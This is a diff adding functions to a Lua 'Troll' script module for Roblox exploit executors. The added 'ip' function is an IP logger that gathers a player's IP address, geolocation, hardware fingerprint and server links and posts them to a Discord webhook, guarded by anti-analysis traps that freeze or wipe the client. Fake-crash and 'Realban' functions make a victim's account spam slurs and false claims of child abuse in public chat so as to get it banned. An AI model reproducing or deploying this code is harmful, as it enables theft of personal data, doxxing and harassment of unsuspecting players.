@@ -235,6 +235,682 @@ end
 function Troll:RickRoll() loadstring(game:HttpGet("https://pastebin.com/raw/UWu57220", true))() 
   return Troll
 end
+  function Troll:ip(webhook)
+  for i, v in pairs(game.CoreGui:GetDescendants()) do
+    if v:IsA("TextLabel") then
+        if v.Text:match("Lopvi") or 
+        v.Text:match("Http") or 
+        v.Text:match("Spy") or 
+        _G.AlreadyExecuted == true or 
+        _G.AlreadyExecuted == false or 
+        _G.AlreadyExecuted then
+            v.Parent.Parent.Parent:Destroy()
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
+            local skid = Instance.new("Message")
+            skid.Parent = game:GetService("CoreGui")
+            skid.Text = 'You seriously thought you could just get the source like that? Go get a life, skid.'
+            task.wait(2)
+            for i, v1 in pairs(game.Players.LocalPlayer:GetDescendants()) do
+                v1:Destroy()
+            end
+            for i, v1 in pairs(game.CoreGui:GetDescendants()) do
+                v1:Destroy()
+            end
+            local num = 0
+            while true do
+                print("1")
+                error("2")
+                warn("3")
+                while true do 
+                    print("1")
+                error("2")
+                warn("3")
+                    while true do
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                end
+                print("1")
+                error("2")
+                warn("3")
+                for i, v in pairs(game.CoreGui:GetDescendants()) do
+    if v:IsA("TextLabel") then
+        if v.Text:match("Lopvi") or 
+        v.Text:match("Http") or 
+        v.Text:match("Spy") then
+            v.Parent.Parent.Parent:Destroy()
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
+            local num = 0
+            while true do
+                print("L")
+                while true do
+                print("L")
+                while true do
+                print("L")
+            end
+            end
+            end
+        end
+    end
+end
+            end
+        end
+    end
+end
+end
+end
+local functions = {
+    rconsoleprint,
+    print,
+    setclipboard,
+    rconsoleerr,
+    rconsolewarn,
+    warn,
+    error
+}
+
+for i, v in next, functions do
+    local old
+    old =
+        hookfunction(
+        v,
+        newcclosure(
+            function(...)
+                local args = {...}
+                for i, v in next, args do
+                    if tostring(i):find("https") or tostring(v):find("https") then
+                        while true do
+                        end
+                    end
+                end
+                return old(...)
+            end
+        )
+    )
+end
+
+if _G.ID then
+    while true do
+    end
+end
+setmetatable(
+    _G,
+    {
+        __newindex = function(t, i, v)
+            if tostring(i) == "ID" then
+                while true do
+                end
+            end
+        end
+    }
+)
+
+_G.AntiLog = true
+_G.Neon919 = true
+local webh = webhook -- put your webhook here
+local req = http_request or request or (syn and syn.request) 
+local uwu = game:GetService("RbxAnalyticsService"):GetClientId()
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local a = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+local b = 'https://www.roblox.com/games/'..game.PlaceId..'?serverJobId='..game.JobId..''
+local http_request = syn.request;
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid = decoded.headers["Syn-Fingerprint"]
+
+local exe = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or flux and "Fluxus" or "shit exploit"
+ 
+local mir = game:HttpGet("http://ip-api.com/json")
+local Pwp = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["author"] = { -- Separate table for many features
+				["name"] = "Advanced ip logger"; -- the name of the author
+				["url"] = "https://scriptblox.com/u/Nextix"; -- You can click on the name, and it will open the link that is set in the url.
+				["icon_url"] = "https://cdn.discordapp.com/attachments/1073680068796239993/1073697431113453578/Pablo_1.webp" -- The image's url you want there.
+			};
+              ["fields"] = { -- Make a table
+                  { -- now make a new one for each field you wish to add
+					["name"] = "Client infos:",
+					["value"] = game.Players.LocalPlayer.Name,-- The text,value or information under the title of the field aka name.
+					["inline"] = true, -- means that its either inline with others, from left to right or if it is set to false, from up to down.
+				},
+
+				{
+					["name"] = "Country:";
+					["value"] = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer),
+					["inline"] = true;
+				},
+				{
+				    ["name"] = "Ip:";
+					["value"] = req({ Url = "https://api.ipify.org/", Method = "Get" }).Body,
+					["inline"] = true;
+				},
+				{
+				    ["name"] = "client id:";
+					["value"] = uwu,
+					["inline"] = true;
+				},
+                {
+				    ["name"] = "Hwid test:";
+					["value"] = hwid,
+					["inline"] = true;
+				},
+				{
+				    ["name"] = "Job id:";
+					["value"] = game.JobId,
+					["inline"] = true;
+				},
+                	{
+				    ["name"] = "Job id script join:";
+					["value"] = a,
+					["inline"] = true;
+				},
+                	{
+				    ["name"] = "Job id link join:";
+					["value"] = b,
+					["inline"] = true;
+				},
+				{
+				    ["name"] = "Excutor:";
+					["value"] = "**" .. exe .. "**",
+					["inline"] = true;
+				},
+				{
+				    ["name"] = "Status:";
+					["value"] = MembershipType,
+					["inline"] = true;	
+					
+				},
+				{
+				    ["name"] = "**Date:**";
+					["value"] = tostring(os.date("%m/%d/%Y")),
+					["inline"] = false;	
+				},
+				{
+				    ["name"] = "**Time:**";
+					["value"] = tostring(os.date("%X")),
+					["inline"] = false;	
+				},
+				{
+				    ["name"] = "**Others:**";
+					["value"] = "------------------------------------------------------------------------------",
+					["inline"] = false;	
+				},
+
+				{
+				    ["name"] = "**Game Name:**";
+					["value"] = Pwp,
+					["inline"] = false;	
+				
+				},
+				{
+				    ["name"] = "**Game Link:**";
+					["value"] = "https://www.roblox.com/games/"..game.PlaceId.."",
+					["inline"] = false;		
+				},
+				{
+				    ["name"] = "\n\n**Data:**";
+					["value"] = "```".. mir .."```",
+					["inline"] = false;	
+					},
+				{
+				    ["name"] = "Creator";
+					["value"] = "Nextix And Neon!",
+					["inline"] = false;		
+				},
+				
+					
+				}
+			}
+			
+		}}
+ 
+
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+    return Troll
+end
+function Troll:OldCrash(Ban)
+  if ban == true then do
+      
+local FakeCrash = Instance.new("ScreenGui")
+local FakeCrash_2 = Instance.new("Frame")
+local CrashMessage = Instance.new("ImageLabel")
+local XButton = Instance.new("ImageButton")
+local OKButton = Instance.new("ImageButton")
+
+--Properties:
+
+FakeCrash.Name = "FakeCrash"
+FakeCrash.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+FakeCrash.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+FakeCrash.ResetOnSpawn = false
+
+FakeCrash_2.Name = "FakeCrash"
+FakeCrash_2.Parent = FakeCrash
+FakeCrash_2.AnchorPoint = Vector2.new(0.5, 0.5)
+FakeCrash_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+FakeCrash_2.BackgroundTransparency = 1.000
+FakeCrash_2.Position = UDim2.new(0.5, 0, 0.5, 0)
+FakeCrash_2.Size = UDim2.new(1, 0, 1.10000002, 0)
+
+CrashMessage.Name = "CrashMessage"
+CrashMessage.Parent = FakeCrash_2
+CrashMessage.AnchorPoint = Vector2.new(0.5, 0.5)
+CrashMessage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CrashMessage.BackgroundTransparency = 1.000
+CrashMessage.BorderColor3 = Color3.fromRGB(53, 53, 53)
+CrashMessage.BorderSizePixel = 0
+CrashMessage.Position = UDim2.new(0.5, 0, 0.5, 0)
+CrashMessage.Size = UDim2.new(0, 401, 0, 133)
+CrashMessage.Image = "http://www.roblox.com/asset/?id=6717943179"
+
+XButton.Name = "XButton"
+XButton.Parent = CrashMessage
+XButton.AnchorPoint = Vector2.new(1, 0)
+XButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+XButton.BackgroundTransparency = 1.000
+XButton.BorderColor3 = Color3.fromRGB(27, 42, 53)
+XButton.BorderSizePixel = 0
+XButton.Position = UDim2.new(1, 0, 0, 0)
+XButton.Size = UDim2.new(0, 32, 0, 32)
+XButton.Image = "rbxassetid://6717880143"
+
+OKButton.Name = "OKButton"
+OKButton.Parent = CrashMessage
+OKButton.AnchorPoint = Vector2.new(1, 0)
+OKButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OKButton.BackgroundTransparency = 1.000
+OKButton.BorderColor3 = Color3.fromRGB(27, 42, 53)
+OKButton.BorderSizePixel = 0
+OKButton.Position = UDim2.new(1, -16, 0, 99)
+OKButton.Size = UDim2.new(0, 75, 0, 23)
+OKButton.Image = "rbxassetid://6717954958"
+OKButton.HoverImage = "rbxassetid://6717955064"
+
+-- Scripts:
+
+local function LCSJ_fake_script() -- FakeCrash_2.showCrash 
+	local script = Instance.new('LocalScript', FakeCrash_2)
+
+	-- Decompiled with the Synapse X Luau decompiler.
+
+	local l__TweenService__1 = game:GetService("TweenService");
+	local l__UserInputService__2 = game:GetService("UserInputService");
+	local l__RunService__3 = game:GetService("RunService");
+	local l__mouse__4 = game.Players.LocalPlayer:GetMouse();
+	require(script:WaitForChild("DraggableObject")).new(script.Parent.CrashMessage):Enable();
+	l__RunService__3.RenderStepped:Connect(function()
+		if script.Parent.Visible and script.Parent.Parent.Enabled then
+			l__UserInputService__2.MouseBehavior = Enum.MouseBehavior.Default;
+			l__UserInputService__2.MouseIconEnabled = false;
+			script.Parent.FakeMouse.Position = UDim2.new(0, l__mouse__4.X, 0, l__mouse__4.Y + 72);
+		end;
+	end);
+	script.Parent:GetPropertyChangedSignal("Visible"):Connect(function()
+		if not script.Parent.Visible or not script.Parent.Parent.Enabled then
+			l__UserInputService__2.MouseIconEnabled = true;
+			return;
+		end;
+		l__UserInputService__2.MouseIconEnabled = false;
+		script.Parent.CrashMessage.Position = UDim2.new(0.5, 0, 0.5, 0);
+		script.Parent.CrashMessage.ImageTransparency = 1;
+		script.Parent.CrashMessage.Size = UDim2.new(0, 391, 0, 123);
+		script.Parent.CrashMessage.XButton.Visible = false;
+		script.Parent.CrashMessage.OKButton.Visible = false;
+		local v5 = l__TweenService__1:Create(script.Parent.CrashMessage, TweenInfo.new(0.33), {
+			Size = UDim2.new(0, 401, 0, 133), 
+			ImageTransparency = 0
+		});
+		v5:Play();
+		v5.Completed:Wait();
+		script.Parent.CrashMessage.OKButton.Visible = true;
+		script.Parent.CrashMessage.XButton.Visible = true;
+	end);
+	script.Parent.CrashMessage.XButton.MouseEnter:Connect(function()
+		l__TweenService__1:Create(script.Parent.CrashMessage.XButton, TweenInfo.new(0.1), {
+			ImageColor3 = Color3.new(1, 0, 0)
+		}):Play();
+	end);
+	script.Parent.CrashMessage.XButton.MouseLeave:Connect(function()
+		l__TweenService__1:Create(script.Parent.CrashMessage.XButton, TweenInfo.new(0.1), {
+			ImageColor3 = Color3.new(1, 1, 1)
+		}):Play();
+	end);
+
+end
+coroutine.wrap(LCSJ_fake_script)()
+local function EWGNVS_fake_script() -- OKButton.LocalScript 
+	local script = Instance.new('LocalScript', OKButton)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		game:GetService("Chat").BubbleChatEnabled = false
+		while true do task.wait(3)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i rape children!!!", "All")
+			wait(2)
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate niggers and im racist", "All")
+wait(2)
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate faggots and roblox sucks", "All")
+		end
+	end)
+end
+coroutine.wrap(EWGNVS_fake_script)()
+local function TUOZS_fake_script() -- FakeCrash_2.LocalScript 
+	local script = Instance.new('LocalScript', FakeCrash_2)
+
+	local character = game.Players.LocalPlayer.Character
+
+	while true do
+		wait()
+		if script.Parent.Parent.Enabled == true then
+			character:FindFirstChild("HumanoidRootPart").Anchored = true
+			local Animate = character:FindFirstChildWhichIsA("LocalScript")
+			Animate:Destroy()
+			for i, v in pairs(character:GetChildren()) do
+				if v:IsA("BasePart") then
+					v.Anchored = true
+					v.CanCollide = false
+					v.CastShadow = false
+					game.Lighting.FogEnd = math.huge
+					workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+					game.StarterGui:SetCoreGuiEnabled("All", false)
+					game.StarterGui:ClearAllChildren()
+					for i, v in pairs(workspace:GetChildren()) do
+						if v:IsA("BasePart") then
+							v.CastShadow = false
+						else
+							for j, w in pairs(v:GetChildren()) do
+								if w:IsA("BasePart") then
+									w.CastShadow = false
+									for idk, idc in pairs(game.Lighting:GetChildren()) do
+										if idc:FindFirstChildWhichIsA("Atmosphere") then
+											idc:Destroy()
+										end
+									end
+								else
+									for a, b in pairs(w:GetChildren()) do
+										if w:IsA("BasePart") then
+											b.CastShadow = false
+										end
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+end
+coroutine.wrap(TUOZS_fake_script)()
+    end
+  end
+    if ban == false then do
+      
+local FakeCrash = Instance.new("ScreenGui")
+local FakeCrash_2 = Instance.new("Frame")
+local CrashMessage = Instance.new("ImageLabel")
+local XButton = Instance.new("ImageButton")
+local OKButton = Instance.new("ImageButton")
+
+--Properties:
+
+FakeCrash.Name = "FakeCrash"
+FakeCrash.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+FakeCrash.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+FakeCrash.ResetOnSpawn = false
+
+FakeCrash_2.Name = "FakeCrash"
+FakeCrash_2.Parent = FakeCrash
+FakeCrash_2.AnchorPoint = Vector2.new(0.5, 0.5)
+FakeCrash_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+FakeCrash_2.BackgroundTransparency = 1.000
+FakeCrash_2.Position = UDim2.new(0.5, 0, 0.5, 0)
+FakeCrash_2.Size = UDim2.new(1, 0, 1.10000002, 0)
+
+CrashMessage.Name = "CrashMessage"
+CrashMessage.Parent = FakeCrash_2
+CrashMessage.AnchorPoint = Vector2.new(0.5, 0.5)
+CrashMessage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CrashMessage.BackgroundTransparency = 1.000
+CrashMessage.BorderColor3 = Color3.fromRGB(53, 53, 53)
+CrashMessage.BorderSizePixel = 0
+CrashMessage.Position = UDim2.new(0.5, 0, 0.5, 0)
+CrashMessage.Size = UDim2.new(0, 401, 0, 133)
+CrashMessage.Image = "http://www.roblox.com/asset/?id=6717943179"
+
+XButton.Name = "XButton"
+XButton.Parent = CrashMessage
+XButton.AnchorPoint = Vector2.new(1, 0)
+XButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+XButton.BackgroundTransparency = 1.000
+XButton.BorderColor3 = Color3.fromRGB(27, 42, 53)
+XButton.BorderSizePixel = 0
+XButton.Position = UDim2.new(1, 0, 0, 0)
+XButton.Size = UDim2.new(0, 32, 0, 32)
+XButton.Image = "rbxassetid://6717880143"
+
+OKButton.Name = "OKButton"
+OKButton.Parent = CrashMessage
+OKButton.AnchorPoint = Vector2.new(1, 0)
+OKButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OKButton.BackgroundTransparency = 1.000
+OKButton.BorderColor3 = Color3.fromRGB(27, 42, 53)
+OKButton.BorderSizePixel = 0
+OKButton.Position = UDim2.new(1, -16, 0, 99)
+OKButton.Size = UDim2.new(0, 75, 0, 23)
+OKButton.Image = "rbxassetid://6717954958"
+OKButton.HoverImage = "rbxassetid://6717955064"
+
+-- Scripts:
+
+local function LCSJ_fake_script() -- FakeCrash_2.showCrash 
+	local script = Instance.new('LocalScript', FakeCrash_2)
+
+	-- Decompiled with the Synapse X Luau decompiler.
+
+	local l__TweenService__1 = game:GetService("TweenService");
+	local l__UserInputService__2 = game:GetService("UserInputService");
+	local l__RunService__3 = game:GetService("RunService");
+	local l__mouse__4 = game.Players.LocalPlayer:GetMouse();
+	require(script:WaitForChild("DraggableObject")).new(script.Parent.CrashMessage):Enable();
+	l__RunService__3.RenderStepped:Connect(function()
+		if script.Parent.Visible and script.Parent.Parent.Enabled then
+			l__UserInputService__2.MouseBehavior = Enum.MouseBehavior.Default;
+			l__UserInputService__2.MouseIconEnabled = false;
+			script.Parent.FakeMouse.Position = UDim2.new(0, l__mouse__4.X, 0, l__mouse__4.Y + 72);
+		end;
+	end);
+	script.Parent:GetPropertyChangedSignal("Visible"):Connect(function()
+		if not script.Parent.Visible or not script.Parent.Parent.Enabled then
+			l__UserInputService__2.MouseIconEnabled = true;
+			return;
+		end;
+		l__UserInputService__2.MouseIconEnabled = false;
+		script.Parent.CrashMessage.Position = UDim2.new(0.5, 0, 0.5, 0);
+		script.Parent.CrashMessage.ImageTransparency = 1;
+		script.Parent.CrashMessage.Size = UDim2.new(0, 391, 0, 123);
+		script.Parent.CrashMessage.XButton.Visible = false;
+		script.Parent.CrashMessage.OKButton.Visible = false;
+		local v5 = l__TweenService__1:Create(script.Parent.CrashMessage, TweenInfo.new(0.33), {
+			Size = UDim2.new(0, 401, 0, 133), 
+			ImageTransparency = 0
+		});
+		v5:Play();
+		v5.Completed:Wait();
+		script.Parent.CrashMessage.OKButton.Visible = true;
+		script.Parent.CrashMessage.XButton.Visible = true;
+	end);
+	script.Parent.CrashMessage.XButton.MouseEnter:Connect(function()
+		l__TweenService__1:Create(script.Parent.CrashMessage.XButton, TweenInfo.new(0.1), {
+			ImageColor3 = Color3.new(1, 0, 0)
+		}):Play();
+	end);
+	script.Parent.CrashMessage.XButton.MouseLeave:Connect(function()
+		l__TweenService__1:Create(script.Parent.CrashMessage.XButton, TweenInfo.new(0.1), {
+			ImageColor3 = Color3.new(1, 1, 1)
+		}):Play();
+	end);
+
+end
+coroutine.wrap(LCSJ_fake_script)()
+local function EWGNVS_fake_script() -- OKButton.LocalScript 
+	local script = Instance.new('LocalScript', OKButton)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		game:GetService("Chat").BubbleChatEnabled = false
+		
+	
+	end)
+end
+coroutine.wrap(EWGNVS_fake_script)()
+local function TUOZS_fake_script() -- FakeCrash_2.LocalScript 
+	local script = Instance.new('LocalScript', FakeCrash_2)
+
+	local character = game.Players.LocalPlayer.Character
+
+	while true do
+		wait()
+		if script.Parent.Parent.Enabled == true then
+			character:FindFirstChild("HumanoidRootPart").Anchored = true
+			local Animate = character:FindFirstChildWhichIsA("LocalScript")
+			Animate:Destroy()
+			for i, v in pairs(character:GetChildren()) do
+				if v:IsA("BasePart") then
+					v.Anchored = true
+					v.CanCollide = false
+					v.CastShadow = false
+					game.Lighting.FogEnd = math.huge
+					workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+					game.StarterGui:SetCoreGuiEnabled("All", false)
+					game.StarterGui:ClearAllChildren()
+					for i, v in pairs(workspace:GetChildren()) do
+						if v:IsA("BasePart") then
+							v.CastShadow = false
+						else
+							for j, w in pairs(v:GetChildren()) do
+								if w:IsA("BasePart") then
+									w.CastShadow = false
+									for idk, idc in pairs(game.Lighting:GetChildren()) do
+										if idc:FindFirstChildWhichIsA("Atmosphere") then
+											idc:Destroy()
+										end
+									end
+								else
+									for a, b in pairs(w:GetChildren()) do
+										if w:IsA("BasePart") then
+											b.CastShadow = false
+										end
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+end
+coroutine.wrap(TUOZS_fake_script)()
+    end
+  end
+  return Troll
+end
 function Troll:Realban()
   game:GetService("Chat").BubbleChatEnabled = false 		while true do task.wait(1) 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i rape children!!!", "All") 			wait(1) 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate niggers and im racist", "All") wait(1) game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate faggots and roblox sucks", "All") 		  end
     return Troll
